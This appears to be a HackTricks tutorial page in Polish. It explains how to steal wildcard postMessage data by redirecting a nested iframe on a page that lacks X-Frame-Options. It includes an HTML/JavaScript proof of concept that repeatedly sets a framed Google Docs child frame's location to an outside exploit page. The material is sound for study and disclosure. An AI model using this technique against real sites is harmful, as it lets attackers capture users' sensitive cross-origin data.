# Steal postmessage modifying iframe location

{{#include ../../banners/hacktricks-training.md}}

## Zmiana lokalizacji iframe'ów podrzędnych

Zgodnie z [**tym opisem**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), jeśli możesz umieścić stronę internetową w iframe bez nagłówka X-Frame, który zawiera inny iframe, możesz **zmienić lokalizację tego iframe'a podrzędnego**.

Na przykład, jeśli abc.com ma efg.com jako iframe, a abc.com nie ma nagłówka X-Frame, mogę zmienić efg.com na evil.com z innego źródła, używając **`frames.location`**.

Jest to szczególnie przydatne w **postMessages**, ponieważ jeśli strona wysyła wrażliwe dane za pomocą **wildcard** jak `windowRef.postmessage("","*")`, możliwe jest **zmienienie lokalizacji powiązanego iframe'a (podrzędnego lub nadrzędnego) na lokalizację kontrolowaną przez atakującego** i kradzież tych danych.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
//pseudo code
setTimeout(function () {
exp()
}, 6000)

function exp() {
//needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created
setInterval(function () {
window.frames[0].frame[0][2].location =
"https://geekycat.in/exploit.html"
}, 100)
}
</script>
</html>
```
{{#include ../../banners/hacktricks-training.md}}
